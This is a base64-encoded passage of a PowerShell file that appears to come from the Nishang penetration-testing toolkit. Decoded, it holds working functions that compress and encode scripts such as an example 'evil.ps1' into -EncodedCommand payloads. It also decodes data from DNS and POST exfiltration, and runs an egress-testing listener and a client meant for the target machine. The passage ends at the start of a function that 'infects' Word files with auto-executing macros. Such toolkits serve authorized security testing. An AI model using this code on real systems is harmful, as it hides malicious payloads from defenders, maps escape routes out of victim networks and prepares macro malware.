b3VsZCBiZSBleGVjdXRlZCBvbiBhIG5vbi1wb3dlcnNoZWxsIGNvbnNvbGUgaXMgYWxzbyBnZW5lcmF0ZWQuClRoZSBlbmNvZGVkIGNvbW1hbmQgaXMgdXNlZnVsIGluIGNhc2Ugb2Ygbm9uLWludGVyYWN0aXZlIHNoZWxscyBsaWtlIHdlYnNoZWxsIG9yIHdoZW4gc3BlY2lhbCBjaGFyYWN0ZXJzIGluIHNjcmlwdHMgbWF5CmNyZWF0ZSBwcm9ibGVtcywgZm9yIGV4YW1wbGUsIGEgbWV0ZXJwcmV0ZXIgc2Vzc2lvbi4KCi5QQVJBTUVURVIgRGF0YVRvRW5jb2RlClRoZSBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRlY29kZWQuIFVzZSB3aXRoIC1Jc1N0cmluZyB0byBlbnRlciBhIHN0cmluZy4KCi5QQVJBTUVURVIgT3V0cHV0RmlsZVBhdGgKVGhlIHBhdGggb2YgdGhlIG91dHB1dCBmaWxlLiBEZWZhdWx0IGlzICJlbmNvZGVkLnR4dCIgaW4gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkuCgouUEFSQU1FVEVSIE91dHB1dENvbW1hbmRGaWxlUGF0aApUaGUgcGF0aCBvZiB0aGUgb3V0cHV0IGZpbGUgd2hlcmUgZW5jb2RlZCBjb21tYW5kIHdvdWxkIGJlIHdyaXR0ZW4uIERlZmF1bHQgaXMgImVuY29kZWRjb21tYW5kLnR4dCIgaW4gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkuCgouUEFSQU1FVEVSIElzU3RyaW5nClVzZSB0aGlzIHRvIHNwZWNpZnkgaWYgeW91IGFyZSBwYXNzaW5nIGEgc3RyaW5nIGlucyBwbGFjZSBvZiBhIGZpbGVwYXRoLgoKLlBBUkFNRVRFUiBPdXRDb21tYW5kCkdlbmVyYXRlIGFuIGVuY29kZWQgY29tbWFuZCB3aGljaCBjb3VsZCBiZSB1c2VkIHdpdGggLUVuY29kZWRDb21tYW5kIHBhcmFtZXRlciBvZiBQb3dlclNoZWxsLgoKLlBBUkFNRVRFUiBQb3N0U2NyaXB0Q29tbWFuZApHZW5lcmF0ZSBhIFBvd2VyU2hlbGwgY29tbWFuZCB3aGljaCBpcyBtdWNoIHNtYWxsZXIgdGhhbiBlbmNvZGVkIHNjcmlwdHMuIFVzZWZ1bCBpbiBzY2VucmlvcyB3aGVyZQpsb25nZXIgY29tbWFuZHMgb3Igc2NyaXB0cyBjb3VsZCBub3QgYmUgdXNlZC4gCgouRVhBTVBMRQoKUFMgPiBJbnZva2UtRW5jb2RlIC1EYXRhVG9FbmNvZGUgQzpcc2NyaXB0c1xkYXRhLnR4dAoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gZ2VuZXJhdGUgZW5jb2RlZCBkYXRhIHdoaWNoIGNvdWxkIGJlIERlY29kZWQgdXNpbmcgdGhlIEludm9rZS1EZWNvZGUgc2NyaXB0LgoKClBTID4gSW52b2tlLUVuY29kZSAtRGF0YVRvRW5jb2RlIEM6XHNjcmlwdHNcZXZpbC5wczEgLU91dENvbW1hbmQKClVzZSBhYm92ZSBjb21tYW5kIHRvIGdlbmVyYXRlIGVuY29kZWQgZGF0YSBhbmQgZW5jb2RlZCBjb21tYW5kIHdoaWNoIGNvdWxkIGJlIHVzZWQgb24gYSBub24tcG93ZXJzaGVsbCBjb25zb2xlLgpVc2UgcG93ZXJzaGVsbCAtRW5jb2RlZENvbW1hbmQgPGdlbmVyYXRlZCBjb2RlIGhlcmU+CgoKLkVYQU1QTEUKClBTID4gSW52b2tlLUVuY29kZSAiQSBTZWNyZXQgbWVzc2FnZSIgLUlzU3RyaW5nCgpVc2UgYWJvdmUgdG8gZW5jb2RlIGEgc3RyaW5nLgoKCi5FWEFNUExFCgpQUyA+IEludm9rZS1FbmNvZGUgR2V0LVByb2Nlc3MgLUlzU3RyaW5nIC1PdXRDb21tYW5kCgpVc2UgYWJvdmUgdG8gZW5jb2RlIGEgY29tbWFuZC4KCgouTElOSwpodHRwOi8vd3d3LmRhcmtvcGVyYXRvci5jb20vYmxvZy8yMDEzLzMvMjEvcG93ZXJzaGVsbC1iYXNpY3MtZXhlY3V0aW9uLXBvbGljeS1hbmQtY29kZS1zaWduaW5nLXBhcnQtMi5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgojPgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREYXRhVG9FbmNvZGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dHB1dEZpbGVQYXRoID0gIi5cZW5jb2RlZC50eHQiLCAKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0Q29tbWFuZEZpbGVQYXRoID0gIi5cZW5jb2RlZGNvbW1hbmQudHh0IiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkT3V0Q29tbWFuZCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkSXNTdHJpbmcsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFBvc3RTY3JpcHRDb21tYW5kCgogICAgKQogICAgaWYoJElzU3RyaW5nIC1lcSAkdHJ1ZSkKICAgIHsKICAgIAogICAgICAgJEVuYyA9ICREYXRhVG9FbmNvZGUKICAgICAgIAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRFbmMgPSBHZXQtQ29udGVudCAkRGF0YVRvRW5jb2RlIC1FbmNvZGluZyBBc2NpaQogICAgfQoKCiAgICAjQ29tcHJlc3Npb24gbG9naWMgZnJvbSBodHRwOi8vd3d3LmRhcmtvcGVyYXRvci5jb20vYmxvZy8yMDEzLzMvMjEvcG93ZXJzaGVsbC1iYXNpY3MtZXhlY3V0aW9uLXBvbGljeS1hbmQtY29kZS1zaWduaW5nLXBhcnQtMi5odG1sCiAgICAkbXMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbQogICAgJGFjdGlvbiA9IFtJTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpDb21wcmVzcwogICAgJGNzID0gTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgkbXMsJGFjdGlvbikKICAgICRzdyA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyICgkY3MsIFtUZXh0LkVuY29kaW5nXTo6QVNDSUkpCiAgICAkRW5jIHwgRm9yRWFjaC1PYmplY3QgeyRzdy5Xcml0ZUxpbmUoJF8pfQogICAgJHN3LkNsb3NlKCkKICAgIAogICAgIyBCYXNlNjQgZW5jb2RlIHN0cmVhbQogICAgJENvbXByZXNzZWQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRtcy5Ub0FycmF5KCkpCiAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJENvbXByZXNzZWQgLUZpbGVQYXRoICRPdXRwdXRGaWxlUGF0aAogICAgV3JpdGUtT3V0cHV0ICJFbmNvZGVkIGRhdGEgd3JpdHRlbiB0byAkT3V0cHV0RmlsZVBhdGgiCgogICAgaWYgKCgkT3V0Q29tbWFuZCAtZXEgJFRydWUpIC1vciAoJFBvc3RTY3JpcHRDb21tYW5kIC1lcSAkVHJ1ZSkpCiAgICB7CiAgICAgICAgI2h0dHA6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMTMvMy8yMS9wb3dlcnNoZWxsLWJhc2ljcy1leGVjdXRpb24tcG9saWN5LWFuZC1jb2RlLXNpZ25pbmctcGFydC0yLmh0bWwKICAgICAgICAkY29tbWFuZCA9ICJJbnZva2UtRXhwcmVzc2lvbiBgJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoIiArCgogICAgICAgICJgJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCIgKwoKICAgICAgICAiYCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwiKwoKICAgICAgICAiYCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCckQ29tcHJlc3NlZCcpKSkpLCAiICsKCiAgICAgICAgIltJTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKSksIisKCiAgICAgICAgIiBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IgogICAgICAgIAogICAgICAgICNHZW5lcmF0ZSBCYXNlNjQgZW5jb2RlZCBjb21tYW5kIHRvIHVzZSB3aXRoIHRoZSBwb3dlcnNoZWxsIC1lbmNvZGVkY29tbWFuZCBwYXJhbXRlciIKICAgICAgICAkVW5pY29kZUVuY29kZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlVuaWNvZGVFbmNvZGluZwogICAgICAgICRFbmNTY3JpcHQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRVbmljb2RlRW5jb2Rlci5HZXRCeXRlcygkY29tbWFuZCkpCiAgICAgICAgI0NoZWNrIGZvciBtYXguIGxlbmd0aCBzdXBwb3J0ZWQgYnkgV2luZG93cy4gSWYgdGhlIGJhc2U2NCBlbmNvZGVkIGNvbW1hbmQgaXMgbG9uZ2VyIHVzZSB0aGUgb3RoZXIgb25lLgogICAgICAgIGlmICgoJEVuY1NjcmlwdC5MZW5ndGggLWd0IDgxOTApIC1vciAoJFBvc3RTY3JpcHRDb21tYW5kIC1lcSAkVHJ1ZSkpCiAgICAgICAgewogICAgICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJGNvbW1hbmQgLUZpbGVQYXRoICRPdXRwdXRDb21tYW5kRmlsZVBhdGgKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJFbmNvZGVkIGNvbW1hbmQgd3JpdHRlbiB0byAkT3V0cHV0Q29tbWFuZEZpbGVQYXRoIgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJEVuY1NjcmlwdCAtRmlsZVBhdGggJE91dHB1dENvbW1hbmRGaWxlUGF0aAogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkVuY29kZWQgY29tbWFuZCB3cml0dGVuIHRvICRPdXRwdXRDb21tYW5kRmlsZVBhdGgiCiAgICAgICAgfQogICAgfQp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNEZWNvZGUgc2NyaXB0cyBhbmQgc3RyaW5ncyBlbmNvZGVkIGJ5IEludm9rZS1FbmNvZGUjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBJbnZva2UtRGVjb2RlCnsKPCMKLlNZTk9QU0lTClNjcmlwdCBmb3IgTmlzaGFuZyB0byBkZWNvZGUgdGhlIGRhdGEgZW5jb2RlZCBieSBJbnZva2UtRW5jb2RlLCBETlMgVFhUIGFuZCBQT1NUIGV4ZmlsdHJhdGlvbiBtZXRob2RzLgoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgYXNrcyBmb3IgYW4gZW5jb2RlZCBzdHJpbmcgYXMgYW4gb3B0aW9uLCBkZWNvZGVzIGl0IGFuZCB3cml0ZXMgdG8gYSBmaWxlICJkZWNvZGVkLnR4dCIgaW4gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkuCkJvdGggdGhlIGVuY29kaW5nIGFuZCBkZWNvZGluZyBpcyBiYXNlZCBvbiB0aGUgY29kZSBieSBpa2Fyc3RlaW4uCgouUEFSQU1FVEVSIEVuY29kZWREYXRhClRoZSBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRlY29kZWQuIFVzZSB3aXRoIC1Jc1N0cmluZyB0byBlbnRlciBhIHN0cmluZy4KCgouUEFSQU1FVEVSIE91dHB1dEZpbGVQYXRoClRoZSBwYXRoIG9mIHRoZSBvdXRwdXQgZmlsZS4gRGVmYXVsdCBpcyAiZGVjb2RlZC50eHQiIGluIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5LgoKLlBBUkFNRVRFUiBJc1N0cmluZwpVc2UgdGhpcyB0byBzcGVjaWZ5IGlmIHlvdSBhcmUgcGFzc2luZyBhIHN0cmluZyBpbnMgcGxhY2Ugb2YgYSBmaWxlcGF0aC4KCi5FWEFNUExFCgpQUyA+IEludm9rZS1EZWNvZGUgLUVuY29kZWREYXRhIEM6XGZpbGVzXGVuY29kZWQudHh0CgouRVhBTVBMRQoKUFMgPiBJbnZva2UtRGVjb2RlIGMwOHQwUTBveWs5T0xTN201UUlBIC1Jc1N0cmluZwoKVXNlIGFib3ZlIHRvIGRlY29kZSBhIHN0cmluZy4KCi5MSU5LCmh0dHA6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMTMvMy8yMS9wb3dlcnNoZWxsLWJhc2ljcy1leGVjdXRpb24tcG9saWN5LWFuZC1jb2RlLXNpZ25pbmctcGFydC0yLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEVuY29kZWREYXRhLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRGaWxlUGF0aCA9ICIuXGRlY29kZWQudHh0IiwgCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJElzU3RyaW5nCiAgICApCiAgICAKICAgIGlmKCRJc1N0cmluZyAtZXEgJHRydWUpCiAgICB7CiAgICAKICAgICAgICRkYXRhID0gJEVuY29kZWREYXRhCiAgICAgICAKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkZGF0YSA9IEdldC1Db250ZW50ICRFbmNvZGVkRGF0YSAtRW5jb2RpbmcgVVRGOCAKICAgIH0KICAgICRkZWMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRkYXRhKQogICAgJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiAgICAkbXMuV3JpdGUoJGRlYywgMCwgJGRlYy5MZW5ndGgpCiAgICAkbXMuU2VlaygwLDApIHwgT3V0LU51bGwKICAgICRjcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCRtcywgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKQogICAgJHNyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCRjcykKICAgICRvdXRwdXQgPSAkc3IucmVhZHRvZW5kKCkKICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkb3V0cHV0IC1GaWxlUGF0aCAkT3V0cHV0RmlsZVBhdGgKICAgIFdyaXRlLUhvc3QgIkRlY29kZSBkYXRhIHdyaXR0ZW4gdG8gJE91dHB1dEZpbGVQYXRoIgp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBMaXN0ZW5lciBmb3IgRWdyZXNzIHRlc3RpbmcgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwo8IwouU1lOT1BTSVMKRmlyZUxpc3RlbmVyIGlzIGEgZnVuY3Rpb25zIHRoYXQgZG9lcyBlZ3Jlc3MgdGVzdGluZy4gSXQgaXMgdG8gYmUgcnVuIG9uIHRoZSBhdHRhY2tpbmcvbGlzdGVuaW5nIG1hY2hpbmUuCgouREVTQ1JJUFRJT04KRmlyZUxpc3RlbmVyIGhvc3RzIGEgbGlzdGVuaW5nIHNlcnZlciB0byB3aGljaCBGaXJlQnVzdGVyIGNhbiBzZW5kIHBhY2tldHMgdG8uIEZpcmVidXN0ZXIgaXMgdG8gYmUgcnVuIG9uIHRoZSB0YXJnZXQgbWFjaGluZSB3aGljaCBpcyB0byAKYmUgdGVzdGVkIGZvciBlZ3Jlc3MgZmlsdGVyaW5nLgoKLkVYQU1QTEUKUFMgPiBGaXJlTGlzdGVuZXIgLXBvcnRyYW5nZSAxMDAwLTEwMjAKCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTQvMDQvZWdyZXNzLXRlc3RpbmctdXNpbmctcG93ZXJzaGVsbC5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCmh0dHA6Ly9yb283YnJlYWsuY28udWsKCi5OT1RFUwpCYXNlZCBvbiB0aGUgc2NyaXB0IHdyaXR0ZW4gYnkgTmlraGlsIFNocmVlS3VtYXIgKEByb283YnJlYWspCiM+CgoKZnVuY3Rpb24gRmlyZUxpc3RlbmVyCnsKICAgIFBhcmFtKCAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBvcnRSYW5nZQogICAgKQogICAgCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiAgICAjQ29kZSB3aGljaCBvcGVucyBhIHNvY2tldCBmb3IgZWFjaCBwb3J0CiAgICAkc29ja2V0YmxvY2sgPSB7IAoJCXBhcmFtKCRwb3J0ID0gJGFyZ3NbMV0pCgkJdHJ5CgkJewoJCQoJCQkkRW5kUG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludChbaXBhZGRyZXNzXTo6YW55LCAkcG9ydCkKCQkJJExpc3RlblNvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUExpc3RlbmVyICRFbmRQb2ludAoJCQkkTGlzdGVuU29ja2V0LlN0YXJ0KCkJCQoJCQkkUmVjRGF0YSA9ICRMaXN0ZW5Tb2NrZXQuQWNjZXB0VENQQ2xpZW50KCkKCQkJJGNsaWVudGlwID0gJFJlY0RhdGEuQ2xpZW50LlJlbW90ZUVuZFBvaW50LkFkZHJlc3MuVG9TdHJpbmcoKQogICAgICAgICAgICAkY2xpZW50cG9ydCA9ICRSZWNEYXRhLkNsaWVudC5Mb2NhbEVuZFBvaW50LlBvcnQuVG9TdHJpbmcoKQoJCQlXcml0ZS1Ib3N0ICIkY2xpZW50aXAgY29ubmVjdGVkIHRocm91Z2ggcG9ydCAkY2xpZW50cG9ydCIgLUZvcmVncm91bmRDb2xvciBHcmVlbgoJCSAgICAkU3RyZWFtLkNsb3NlKCkKCQkJJExpc3RlblNvY2tldC5TdG9wKCkJCQoJCQl9IGNhdGNoCgkJCXsgV3JpdGUtRXJyb3IgJEVycm9yWzBdCX0KICAgIH0KCQkKCVtpbnRdICRsb3dwb3J0ID0gJHBvcnRyYW5nZS5zcGxpdCgiLSIpWzBdCglbaW50XSAkaGlnaHBvcnQgPSAkcG9ydHJhbmdlLnNwbGl0KCItIilbMV0JCglbaW50XSAkcG9ydHMgPSAwCSAgIAoJR2V0LUpvYiB8IFJlbW92ZS1Kb2IKCiAgICAjU3RhcnQgYSBqb2IgZm9yIGVhY2ggcG9ydAoJZm9yKCRwb3J0cz0kbG93cG9ydDsgJHBvcnRzIC1sZSAkaGlnaHBvcnQ7ICRwb3J0cysrKQoJewoJCSJMaXN0ZW5pbmcgb24gcG9ydCAkcG9ydHMiCQogICAgICAgICRqb2IgPSBzdGFydC1qb2IgLVNjcmlwdEJsb2NrICRzb2NrZXRibG9jayAtQXJndW1lbnRMaXN0ICRwb3J0cyAtTmFtZSAkcG9ydHMKCX0KCgoJW2NvbnNvbGVdOjpUcmVhdENvbnRyb2xDQXNJbnB1dCA9ICR0cnVlCgl3aGlsZSAoJHRydWUpCgl7CgkJIyBjb2RlIGZyb20gaHR0cDovL3Bvc2hjb2RlLm9yZy81NDIgdG8gY2FwdHVyZSBDdHJsK0MKCQkjIHN0YXJ0IGNvZGUgc25pcAoJCWlmICgkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUgLWFuZCAoMyAtZXEgW2ludF0kSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJBbGxvd0N0cmxDLEluY2x1ZGVLZXlVcCxOb0VjaG8iKS5DaGFyYWN0ZXIpKQoJCXsKCQkJV3JpdGUtSG9zdCAiU3RvcHBpbmcgYWxsIGpvYnMuLi4uLlRoaXMgY2FuIHRha2UgbWFueSBtaW51dGVzLiIgLUJhY2tncm91bmQgRGFya1JlZAoJCQlTbGVlcCAyCiAgICAgICAgICAgIEdldC1Kb2IgfCBTdG9wLUpvYiAKICAgICAgICAgICAgR2V0LUpvYiB8IFJlbW92ZS1Kb2IKCQkJI1N0b3AtUHJvY2VzcyAtSWQgJFBJRAoJCQlicmVhazsKCQl9CgkJIyBlbmQgY29kZSBzbmlwCgkJCgogICAgICAgICNTdGFydCBhIG5ldyBqb2Igd2hpY2ggbGlzdGVucyBvbiB0aGUgc2FtZSBwb3J0IGZvciBldmVyeSBjb21wbGV0ZWQgam9iLgoJCWZvcmVhY2ggKCRqb2IxIGluIChHZXQtSm9iKSkKCQl7IAogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CgkJCUdldC1Kb2IgfCBSZWNlaXZlLUpvYgoJCQlpZiAoJGpvYjEuU3RhdGUgLWVxICJDb21wbGV0ZWQiKQoJCQl7CgkJCQkkcG9ydCA9ICRqb2IxLk5hbWUKICAgICAgICAgICAgICAgICJMaXN0ZW5pbmcgb24gcG9ydCAkcG9ydCIKICAgICAgICAgICAgICAgICRuZXdqb2JzID0gc3RhcnQtam9iIC1TY3JpcHRCbG9jayAkc29ja2V0YmxvY2sgLUFyZ3VtZW50TGlzdCAkcG9ydCAtTmFtZSAkcG9ydAogICAgICAgICAgICAgICAgR2V0LUpvYiB8IFJlbW92ZS1Kb2IKCQkJfQoJCX0KCX0KfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgQ29ubmVjdG9yIGZvciBFZ3Jlc3MgVGVzdGluZyAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBGaXJlQnVzdGVyewoKPCMKLlNZTk9QU0lTClRoaXMgc2NyaXB0IGlzIHBhcnQgb2YgTmlzaGFuZy4gRmlyZUJ1c3RlciBpcyBhIFBvd2VyU2hlbGwgc2NyaXB0IHRoYXQgZG9lcyBlZ3Jlc3MgdGVzdGluZy4gSXQgaXMgdG8gYmUgcnVuIG9uIHRoZSB0YXJnZXQgbWFjaGluZS4KCi5ERVNDUklQVElPTgpGaXJlQnVzdGVyIHNlbmRzIHBhY2tldHMgdG8gRmlyZUxpc3RlbmVyLCB3aGljaCBob3N0cyBhIGxpc3RlbmluZyBzZXJ2ZXIuIEJ5IGRlZmF1bHQsIEZpcmVCdXN0ZXIgc2VuZHMgcGFja2V0cyB0byBhbGwgcG9ydHMgKHdoaWNoIGNvdWxkIGJlIFZFUlkgc2xvdykuCgouRVhBTVBMRQpQUz4gRmlyZUJ1c3RlciAxMC4xMC4xMC4xMCAxMDAwLTEwMjAKCi5FWEFNUExFClBTPiBGaXJlQnVzdGVyIDEwLjEwLjEwLjEwIDEwMDAtMTAyMCAtVmVyYm9zZQpVc2UgYWJvdmUgZm9yIGluY3JlYXNlZCB2ZXJib3NpdHkuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE0LzA0L2VncmVzcy10ZXN0aW5nLXVzaW5nLXBvd2Vyc2hlbGwuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwpodHRwOi8vcm9vN2JyZWFrLmNvLnVrCgouTk9URVMKTWFqb3IgcGFydCBvZiB0aGUgc2NyaXB0IGlzIHdyaXR0ZW4gYnkgTmlraGlsIFNocmVlS3VtYXIgKEByb283YnJlYWspCiM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKCAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHRhcmdldGlwID0gJCh0aHJvdyAiUGxlYXNlIHNwZWNpZnkgYW4gRW5kUG9pbnQgKEhvc3Qgb3IgSVAgQWRkcmVzcykiKSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10gJHBvcnRyYW5nZSA9ICIxLTY1NTM1IgogICAgKQogICAgCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnICAgIAogICAgW2ludF0gJGxvd3BvcnQgPSAkcG9ydHJhbmdlLnNwbGl0KCItIilbMF0KICAgIFtpbnRdICRoaWdocG9ydCA9ICRwb3J0cmFuZ2Uuc3BsaXQoIi0iKVsxXQoJCiAgICAkaG9zdGFkZHIgPSBbc3lzdGVtLm5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkdGFyZ2V0aXApCiAgICBXcml0ZS1WZXJib3NlICJUcnlpbmcgdG8gY29ubmVjdCB0byAkaG9zdGFkZHIgZnJvbSAkbG93cG9ydCB0byAkaGlnaHBvcnQiCglbaW50XSAkcG9ydHMgPSAwCglXcml0ZS1Ib3N0ICJTZW5kaW5nLi4uLiIKCWZvcigkcG9ydHM9JGxvd3BvcnQ7ICRwb3J0cyAtbGUgJGhpZ2hwb3J0IDsgJHBvcnRzKyspewogICAgICAgIHRyeXsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVHJ5aW5nIHBvcnQgJHBvcnRzIgogICAgICAgICAgICAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgICAgICAgICRiZWdpbkNvbm5lY3QgPSAkY2xpZW50LkJlZ2luQ29ubmVjdCgkaG9zdGFkZHIsJHBvcnRzLCRudWxsLCRudWxsKQogICAgICAgICAgICAkVGltZU91dCA9IDMwMAogICAgICAgICAgICBpZigkY2xpZW50LkNvbm5lY3RlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiQ29ubmVjdGVkIHRvIHBvcnQgJHBvcnRzIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpICRUaW1lT3V0CiAgICAgICAgICAgICAgICBpZigkY2xpZW50LkNvbm5lY3RlZCkgCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiQ29ubmVjdGVkIHRvIHBvcnQgJHBvcnRzIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGNsaWVudC5DbG9zZSgpCiAgICAgICAgfWNhdGNoIHsgV3JpdGUtRXJyb3IgJEVycm9yWzBdfQogICAgfSAgICAgICAgCglXcml0ZS1Ib3N0ICJEYXRhIHNlbnQgdG8gYWxsIHBvcnRzIgp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjQ2xpZW50IFNpZGUgQXR0YWNrIGZ1bmN0aW9ucyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI091dC1Xb3JkIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIE91dC1Xb3JkCnsKPCMKLlNZTk9QU0lTCk5pc2hhbmcgU2NyaXB0IHdoaWNoIGNhbiBnZW5lcmF0ZSBhbmQgImluZmVjdCIgZXhpc3Rpbmcgd29yZCBmaWxlcyB3aXRoIGFuIGF1dG8gZXhlY3V0YWJsZSBtYWNyby4gCgouREVTQ1JJUFRJT04KVGhlIHNjcmlwdCBjYW4gY3JlYXRlIGFzIHdlbGwgYXMgImluZmVjdCIgZXhpc3Rpbmcgd29yZCBmaWxlcyB3aXRoIGFuIGF1dG8gZXhlY3